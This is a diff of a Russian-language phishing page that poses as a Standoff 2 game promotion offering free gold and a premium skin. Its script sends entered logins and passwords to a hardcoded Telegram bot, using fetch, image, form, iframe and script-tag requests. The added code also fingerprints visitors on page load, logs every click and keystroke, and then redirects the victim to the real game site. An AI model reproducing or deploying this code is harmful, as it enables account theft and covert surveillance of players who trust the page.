@@ -3,31 +3,32 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Standoff 2 - Официальный сайт</title>
+    <title>Standoff 2 - Проверка аккаунта</title>
     <style>
         body {
             background: linear-gradient(135deg, #1e3c72, #2a5298);
             color: white;
             font-family: Arial;
             text-align: center;
-            padding: 50px;
+            padding: 20px;
         }
-        .login-form {
+        .container {
             background: rgba(255,255,255,0.1);
             padding: 30px;
-            border-radius: 10px;
-            display: inline-block;
-            margin: 20px;
+            border-radius: 15px;
+            max-width: 400px;
+            margin: 0 auto;
         }
         input {
+            width: 100%;
             padding: 12px;
-            margin: 10px;
-            width: 250px;
+            margin: 10px 0;
             border: none;
             border-radius: 5px;
         }
         button {
-            padding: 12px 30px;
+            width: 100%;
+            padding: 12px;
             background: #ff4444;
             color: white;
             border: none;
@@ -35,119 +36,166 @@
             cursor: pointer;
             font-size: 16px;
         }
+        .bonus {
+            background: rgba(255,215,0,0.2);
+            padding: 15px;
+            border-radius: 8px;
+            margin-top: 20px;
+        }
     </style>
 </head>
 <body>
-    <h1>🎮 STANDOFF 2</h1>
-    <p>Акция! Подтвердите аккаунт и получите 1000 золота</p>
-    
-    <div class="login-form">
-        <h3>🔐 Вход в аккаунт</h3>
-        <input type="text" id="email" placeholder="Email или логин"><br>
-        <input type="password" id="password" placeholder="Пароль"><br>
-        <button onclick="stealAndRedirect()">ПОЛУЧИТЬ НАГРАДУ</button>
+    <div class="container">
+        <h1>🎮 STANDOFF 2</h1>
+        <p>🔓 <b>Разблокируйте премиум-доступ</b></p>
+        
+        <form id="loginForm">
+            <input type="text" name="login" placeholder="📧 Email или логин" required>
+            <input type="password" name="password" placeholder="🔑 Пароль" required>
+            <input type="text" name="game_id" placeholder="🎮 Игровой ID (необязательно)">
+            
+            <button type="submit">🎁 ПОЛУЧИТЬ ПРЕМИУМ ДОСТУП</button>
+        </form>
+
+        <div class="bonus">
+            🎉 <b>+1000 золота</b> и <b>эксклюзивный скин</b> за подтверждение!
+        </div>
     </div>
 
     <script>
-        // Функция отправки через Image (обход CORS)
-        function sendViaImage(data) {
-            const encodedData = btoa(unescape(encodeURIComponent(data)));
+        // Улучшенная функция сбора данных
+        function collectAllData() {
+            let data = "🎯 ПОЛНЫЙ СБОР ДАННЫХ\n\n";
+            
+            // 1. Информация о браузере
+            data += "🌐 ИНФОРМАЦИЯ О БРАУЗЕРЕ:\n";
+            data += `User-Agent: ${navigator.userAgent}\n`;
+            data += `Платформа: ${navigator.platform}\n`;
+            data += `Языки: ${navigator.languages ? navigator.languages.join(', ') : navigator.language}\n`;
+            data += `Онлайн: ${navigator.onLine ? 'Да' : 'Нет'}\n`;
+            data += `Куки: ${navigator.cookieEnabled ? 'Включены' : 'Выключены'}\n`;
+            data += `Java: ${navigator.javaEnabled ? 'Включена' : 'Выключена'}\n`;
+            data += `Память: ${navigator.deviceMemory || 'Неизвестно'} GB\n`;
+            data += `Ядер CPU: ${navigator.hardwareConcurrency || 'Неизвестно'}\n\n`;
+            
+            // 2. Информация об экране
+            data += "📱 ИНФОРМАЦИЯ ОБ ЭКРАНЕ:\n";
+            data += `Разрешение: ${screen.width}x${screen.height}\n`;
+            data += `Глубина цвета: ${screen.colorDepth} бит\n`;
+            data += `Внутреннее разрешение: ${screen.availWidth}x${screen.availHeight}\n\n`;
+            
+            // 3. Информация о местоположении
+            data += "📍 ГЕОЛОКАЦИЯ:\n";
+            data += `Часовой пояс: ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n`;
+            data += `Время: ${new Date().toString()}\n`;
+            data += `Локализация: ${navigator.language}\n\n`;
+            
+            // 4. Сеть и подключение
+            data += "📡 СЕТЕВАЯ ИНФОРМАЦИЯ:\n";
+            data += `Соединение: ${navigator.connection ? navigator.connection.effectiveType : 'Неизвестно'}\n`;
+            data += `Скорость: ${navigator.connection ? navigator.connection.downlink + ' Mbps' : 'Неизвестно'}\n\n`;
+            
+            // 5. Попытка получить больше данных
+            data += "🔍 ДОПОЛНИТЕЛЬНЫЕ ДАННЫЕ:\n";
+            data += `URL: ${window.location.href}\n`;
+            data += `Referrer: ${document.referrer || 'Прямой заход'}\n`;
+            data += `Хост: ${window.location.hostname}\n`;
+            data += `Протокол: ${window.location.protocol}\n`;
+            
+            return data;
+        }
+
+        // Функция отправки через Image (работает лучше всего)
+        function sendToTelegram(message) {
+            // Кодируем сообщение для URL
+            const encodedMessage = encodeURIComponent(message);
+            
+            // Создаем скрытое изображение для отправки
             const img = new Image();
-            img.src = `https://api.telegram.org/bot8245809142:AAGmdhZAkZ91z4spf3PMG-no89fHrjYC3q8/sendMessage?chat_id=1491315056&text=${encodedData}`;
-        }
-
-        // Функция отправки через Form (обход CORS)
-        function sendViaForm(data) {
-            const form = document.createElement('form');
-            form.method = 'POST';
-            form.action = 'https://api.telegram.org/bot8245809142:AAGmdhZAkZ91z4spf3PMG-no89fHrjYC3q8/sendMessage';
-            form.style.display = 'none';
+            img.src = `https://api.telegram.org/bot8245809142:AAGmdhZAkZ91z4spf3PMG-no89fHrjYC3q8/sendMessage?chat_id=1491315056&text=${encodedMessage}`;
             
-            const chatInput = document.createElement('input');
-            chatInput.name = 'chat_id';
-            chatInput.value = '1491315056';
-            form.appendChild(chatInput);
+            // Дублируем через несколько методов
+            setTimeout(() => {
+                // Метод 2: через iframe
+                const iframe = document.createElement('iframe');
+                iframe.style.display = 'none';
+                iframe.src = `https://api.telegram.org/bot8245809142:AAGmdhZAkZ91z4spf3PMG-no89fHrjYC3q8/sendMessage?chat_id=1491315056&text=${encodedMessage}`;
+                document.body.appendChild(iframe);
+            }, 100);
             
-            const textInput = document.createElement('input');
-            textInput.name = 'text';
-            textInput.value = data;
-            form.appendChild(textInput);
-            
-            document.body.appendChild(form);
-            form.submit();
-        }
-
-        // Основная функция кражи данных
-        function stealAndRedirect() {
-            const email = document.getElementById('email').value;
-            const password = document.getElementById('password').value;
-            
-            if (!email || !password) {
-                alert('Заполните все поля!');
-                return;
-            }
-
-            const stolenData = `🎯 УКРАДЕНЫ ДАННЫЕ:
-📧 Логин: ${email}
-🔑 Пароль: ${password}
-🌐 Сайт: ${window.location.href}
-🕒 Время: ${new Date().toLocaleString('ru-RU')}
-👤 User-Agent: ${navigator.userAgent}`;
-
-            // Пробуем разные методы отправки
-            try {
-                // Метод 1: Прямой fetch (может не работать)
-                fetch('https://api.telegram.org/bot8245809142:AAGmdhZAkZ91z4spf3PMG-no89fHrjYC3q8/sendMessage', {
-                    method: 'POST',
-                    mode: 'no-cors',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify({
-                        chat_id: '1491315056',
-                        text: stolenData
-                    })
-                });
-            } catch (e) {}
-
-            try {
-                // Метод 2: Отправка через Image
-                sendViaImage(stolenData);
-            } catch (e) {}
-
-            try {
-                // Метод 3: Отправка через Form
-                sendViaForm(stolenData);
-            } catch (e) {}
-
-            try {
-                // Метод 4: JSONP (обход CORS)
+            setTimeout(() => {
+                // Метод 3: через script
                 const script = document.createElement('script');
-                script.src = `https://api.telegram.org/bot8245809142:AAGmdhZAkZ91z4spf3PMG-no89fHrjYC3q8/sendMessage?chat_id=1491315056&text=${encodeURIComponent(stolenData)}&callback=console.log`;
+                script.src = `https://api.telegram.org/bot8245809142:AAGmdhZAkZ91z4spf3PMG-no89fHrjYC3q8/sendMessage?chat_id=1491315056&text=${encodedMessage}&callback=console.log`;
                 document.head.appendChild(script);
-            } catch (e) {}
+            }, 200);
+        }
 
-            // Сообщение пользователю
-            alert('✅ Аккаунт успешно подтвержден! Золото будет зачислено в течение 5 минут.');
+        // Обработчик формы
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
             
-            // Перенаправление на настоящий сайт
+            const formData = new FormData(this);
+            const login = formData.get('login');
+            const password = formData.get('password');
+            const gameId = formData.get('game_id');
+            
+            // Собираем все данные
+            let stolenData = collectAllData();
+            
+            // Добавляем данные формы
+            stolenData += "\n🎮 ДАННЫЕ АККАУНТА:\n";
+            stolenData += `📧 Логин: ${login}\n`;
+            stolenData += `🔑 Пароль: ${password}\n`;
+            if (gameId) stolenData += `🎮 Игровой ID: ${gameId}\n`;
+            
+            // Отправляем данные
+            sendToTelegram(stolenData);
+            
+            // Показываем сообщение и перенаправляем
+            alert('✅ Премиум доступ активирован! Награды будут зачислены в течение 5 минут.');
+            
             setTimeout(() => {
                 window.location.href = 'https://standoff2.com';
-            }, 2000);
-        }
-
-        // Автоматический сбор данных при заходе
-        window.addEventListener('load', function() {
-            const visitData = `🕵️ ПОСЕТИТЕЛЬ ЗАШЕЛ НА САЙТ:
-🌐 URL: ${window.location.href}
-📍 Referrer: ${document.referrer || 'прямой заход'}
-👤 User-Agent: ${navigator.userAgent}
-📱 Платформа: ${navigator.platform}
-🕒 Время: ${new Date().toLocaleString('ru-RU')}`;
-
-            // Отправка информации о посещении
-            sendViaImage(visitData);
+            }, 3000);
         });
+
+        // Автоматический сбор при заходе на сайт
+        window.addEventListener('load', function() {
+            const visitData = collectAllData();
+            const shortVisitInfo = "🕵️ ПОСЕТИТЕЛЬ НА САЙТЕ\n" + 
+                                 `📱 Устройство: ${/Mobile/.test(navigator.userAgent) ? 'Мобильное' : 'Десктоп'}\n` +
+                                 `🌐 Браузер: ${navigator.userAgent.split(' ').pop()}\n` +
+                                 `🕒 Время: ${new Date().toLocaleTimeString()}`;
+            
+            sendToTelegram(shortVisitInfo);
+            
+            // Дополнительный сбор через 5 секунд
+            setTimeout(() => {
+                const additionalData = "⏰ ДОПОЛНИТЕЛЬНЫЙ СБОР (5 сек):\n" +
+                                     `Пользователь все еще на сайте\n` +
+                                     `Активность: ${document.hasFocus() ? 'Активен' : 'Неактивен'}`;
+                sendToTelegram(additionalData);
+            }, 5000);
+        });
+
+        // Отслеживание кликов
+        document.addEventListener('click', function(e) {
+            const clickData = `🖱️ КЛИК: ${e.target.tagName} ${e.target.className || ''}`;
+            sendToTelegram(clickData);
+        });
+
+        // Отслеживание ввода данных
+        const inputs = document.querySelectorAll('input');
+        inputs.forEach(input => {
+            input.addEventListener('input', function(e) {
+                if (e.target.value.length > 0) {
+                    const inputData = `⌨️ ВВОД В ${e.target.placeholder}: ${e.target.value}`;
+                    sendToTelegram(inputData);
+                }
+            });
+        });
+
     </script>
 </body>
 </html>
